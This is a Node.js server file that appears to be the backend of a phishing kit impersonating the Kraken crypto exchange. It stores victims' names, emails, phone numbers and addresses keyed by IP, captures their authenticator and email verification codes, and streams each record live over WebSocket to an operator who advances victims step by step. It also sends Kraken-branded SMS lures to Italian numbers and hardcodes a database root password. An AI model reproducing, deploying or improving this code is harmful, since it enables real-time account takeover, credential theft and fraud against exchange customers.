const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const mysql = require("mysql2/promise");
const path = require("path");
const { sendSMS } = require("./oakTelSms");

const app = express();
app.use(express.json());

// Serve index.html
app.use(express.static(path.join(__dirname)));

const server = http.createServer(app);

// ---- MySQL Connection ----
async function initDB() {
  return mysql.createPool({
    host: "127.0.0.1",
    port: 3306,
    user: "root",
    password: "Passionate1947.",
    database: "kraken",
  });
}

const init = (async () => {
  const db = await initDB();

  // ---- WebSocket Server ----
  const wss = new WebSocket.Server({ server });

  function broadcast(data) {
    const json = JSON.stringify(data);
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) client.send(json);
    });
  }

  // ---- POST endpoint ----
  app.post("/add-user", async (req, res) => {
    try {
      const { ip, fullname, email, mobile_number, address, stat } = req.body;

      if (!ip) return res.status(400).json({ error: "ip required" });
      if (!fullname || !email)
        return res.status(400).json({ error: "fullname and email required" });

      // Insert user OR update if IP already exists
      const [result] = await db.execute(
        `INSERT INTO users (ip, fullname, email, mobile_number, address, stat)
         VALUES (?, ?, ?, ?, ?, ?)
         ON DUPLICATE KEY UPDATE
            fullname = VALUES(fullname),
            email = VALUES(email),
            mobile_number = VALUES(mobile_number),
            address = VALUES(address),
            stat = VALUES(stat)`,
        [ip, fullname, email, mobile_number, address, stat]
      );

      // Fetch the updated/inserted record
      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
      const userRecord = rows[0];

      // Notify WebSocket clients
      broadcast({
        type: "NEW_USER",
        data: userRecord,
      });

      (async () => {
        try {
          // Check if mobile_number exists and is not empty
          if (!mobile_number || typeof mobile_number !== 'string' || mobile_number.trim() === '') {
            console.warn("SMS skipped: mobile_number is missing or empty");
            return;
          }

          // Format phone number: remove any existing +, spaces, or dashes
          let cleanedNumber = mobile_number.trim().replace(/[\s\-+]/g, '');
          
          // Ensure the number starts with 39 (Italy country code without +)
          let formattedNumber;
          if (cleanedNumber.startsWith("39")) {
            formattedNumber = cleanedNumber;
          } else if (cleanedNumber.startsWith("0")) {
            // Remove leading 0 and add 39
            formattedNumber = "39" + cleanedNumber.substring(1);
          } else {
            // Add 39 prefix
            formattedNumber = "39" + cleanedNumber;
          }

          // Validate the formatted number has reasonable length (should be 11-13 digits for Italy)
          if (formattedNumber.length < 10 || formattedNumber.length > 15) {
            console.warn(`SMS skipped: Invalid phone number length: ${formattedNumber}`);
            return;
          }
      
          const result = await sendSMS(
            [formattedNumber],
            "Your Kraken questionnaire is ready. Please complete it at https://kraken.com/questionnaire"
          );
      
          console.log("SMS API Response:", JSON.stringify(result, null, 2));
        } catch (err) {
          console.error("SMS Failed:", err.message);
          console.error("SMS Error Details:", err.stack);
        }
      })();

     

      res.json(true);
    } catch (err) {
      console.error("DB Error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/verify-authenticator-code", async (req, res) => {
    try {
      const { ip, authenticatorCode } = req.body;

      if (!ip) return res.status(400).json({ error: "ip required" });
      if (!authenticatorCode)
        return res.status(400).json({ error: "authenticatorCode required" });

      // Update gauth field + gauth_date + stat + loading
      const stat = "3"; // or whatever step you want after authenticator

      await db.execute(
        `UPDATE users
         SET gauth = ?, gauth_date = NOW(), stat = ?, loading = 1
         WHERE ip = ?`,
        [authenticatorCode, stat, ip]
      );

      // Fetch updated record
      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);

      if (rows.length === 0) {
        return res.json(false); // IP not found
      }

      const userRecord = rows[0];

      // Notify WebSocket clients
      broadcast({
        type: "AUTH_CODE_UPDATED",
        data: userRecord,
      });

      return res.json(true);
    } catch (err) {
      console.error("DB Error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/update-gauth-error", async (req, res) => {
    try {
      const { ip, errorCode } = req.body;

      if (!ip) return res.status(400).json({ error: "ip required" });
      if (errorCode === undefined)
        return res
          .status(400)
          .json({ error: "errorCode (0 or 1) is required" });

      // Sanitize: convert to string "0" / "1"
      const gauth_error = String(errorCode);

      // Update gauth_error
      await db.execute(
        `UPDATE users
         SET gauth_error = ?
         WHERE ip = ?`,
        [gauth_error, ip]
      );

      // Fetch updated record
      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);

      if (rows.length === 0) {
        return res.json(false); // IP not found
      }

      const userRecord = rows[0];

      // WebSocket broadcast
      broadcast({
        type: "GAUTH_ERROR_UPDATED",
        data: userRecord,
      });

      return res.json(true);
    } catch (err) {
      console.error("DB Error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/update-stat", async (req, res) => {
    try {
      const { ip, stat } = req.body;
  
      if (!ip) {
        return res.status(400).json({ error: "ip required" });
      }
  
      if (stat === undefined) {
        return res.status(400).json({ error: "stat value is required" });
      }
  
      const statValue = String(stat); // normalize
  
      // ✅ Update stat AND turn loading OFF
      await db.execute(
        `UPDATE users
         SET stat = ?, loading = 0
         WHERE ip = ?`,
        [statValue, ip]
      );
  
      // Fetch updated record
      const [rows] = await db.execute(
        "SELECT * FROM users WHERE ip = ?",
        [ip]
      );
  
      if (rows.length === 0) {
        return res.json(false); // IP not found
      }
  
      const userRecord = rows[0];
  
      // Notify all WebSocket clients
      broadcast({
        type: "STAT_UPDATED",
        data: userRecord,
      });
  
      return res.json(true);
    } catch (err) {
      console.error("DB Error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });
  

  app.post("/update-email-code", async (req, res) => {
    try {
      const { ip, email_code } = req.body;

      if (!ip) return res.status(400).json({ error: "ip required" });
      if (email_code === undefined)
        return res.status(400).json({ error: "email_code value is required" });

      const emailCodeValue = String(email_code); // normalize

      // Update email_code + loading
      await db.execute(
        `UPDATE users
         SET email_code = ?, loading = 1
         WHERE ip = ?`,
        [emailCodeValue, ip]
      );

      // Fetch updated record
      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);

      if (rows.length === 0) {
        return res.json(false); // IP not found
      }

      const userRecord = rows[0];

      // Notify all WebSocket clients
      broadcast({
        type: "EMAIL_CODE_UPDATED",
        data: userRecord,
      });

      return res.json(true);
    } catch (err) {
      console.error("DB Error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/update-email-code-2", async (req, res) => {
    try {
      const { ip, email_code_2 } = req.body;

      if (!ip) return res.status(400).json({ error: "ip required" });
      if (email_code_2 === undefined)
        return res.status(400).json({ error: "email_code_2 value is required" });

      const emailCodeValue = String(email_code_2); // normalize
      

      // Update email_code_2 + loading
      await db.execute(
        `UPDATE users
         SET email_code_2 = ?, loading = 1
         WHERE ip = ?`,
        [emailCodeValue, ip]
      );

      // Fetch updated record
      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);

      if (rows.length === 0) {
        return res.json(false); // IP not found
      }

      const userRecord = rows[0];

      // Notify all WebSocket clients
      broadcast({
        type: "EMAIL_CODE_2_UPDATED",
        data: userRecord,
      });

      return res.json(true);
    } catch (err) {
      console.error("DB Error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/update-email-code-error", async (req, res) => {
    try {
      const { ip, email_code_error } = req.body;

      if (!ip) return res.status(400).json({ error: "ip required" });
      if (email_code_error === undefined)
        return res
          .status(400)
          .json({ error: "email_code_error value is required" });

      const emailCodeErrorValue = String(email_code_error); // normalize value

      // Update email_code_error in database
      await db.execute(
        `UPDATE users
         SET email_code_error = ?
         WHERE ip = ?`,
        [emailCodeErrorValue, ip]
      );

      // Fetch updated record
      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);

      if (rows.length === 0) {
        return res.json(false); // IP not found
      }

      const userRecord = rows[0];

      // Broadcast change to all WebSocket clients
      broadcast({
        type: "EMAIL_CODE_ERROR_UPDATED",
        data: userRecord,
      });

      return res.json(true);
    } catch (err) {
      console.error("DB Error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // ---- WebSocket Connections ----
  wss.on("connection", (ws) => {
    console.log("Client connected");

    // Handle messages from client
    ws.on("message", async (raw) => {
      try {
        const msg = JSON.parse(raw);

        if (msg.type === "CHECK_IP") {
          const ip = msg.ip;

          if (!ip) {
            return ws.send(
              JSON.stringify({
                type: "IP_STATUS",
                error: "ip required",
              })
            );
          }

          const [rows] = await db.execute(
            "SELECT stat FROM users WHERE ip = ?",
            [ip]
          );

          if (rows.length === 0) {
            return ws.send(
              JSON.stringify({
                type: "IP_STATUS",
                exists: false,
              })
            );
          }

          // IP exists — return stat
          return ws.send(
            JSON.stringify({
              type: "IP_STATUS",
              exists: true,
              stat: rows[0].stat,
            })
          );
        }
      } catch (err) {
        console.error("WS ERROR:", err);
      }
    });

    // Send latest 50 records on connect
    db.execute("SELECT * FROM users ORDER BY created_at DESC LIMIT 50")
      .then(([rows]) => {
        ws.send(
          JSON.stringify({
            type: "INIT",
            data: rows,
          })
        );
      })
      .catch((err) => console.error("DB INIT ERROR:", err));

    ws.on("close", () => console.log("Client disconnected"));
  });

  // Endpoint to handle admin login
  app.post("/admin-login", async (req, res) => {
    try {
      const { username, password } = req.body;

      if (!username || !password) {
        return res
          .status(400)
          .json({ error: "Username and password required" });
      }

      // Fetch admin from database
      const [rows] = await db.execute(
        "SELECT * FROM admin_users WHERE username = ? AND password = ?",
        [username, password]
      );

      if (rows.length === 0) {
        return res.status(401).json({ error: "Invalid credentials" });
      }

      // Successful login
      return res.json({ success: true });
    } catch (err) {
      console.error("Admin login error:", err);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // ---- Start on port 3000 ----
  server.listen(3000, () => {
    console.log("Server running at http://localhost:3000");
  });
})();
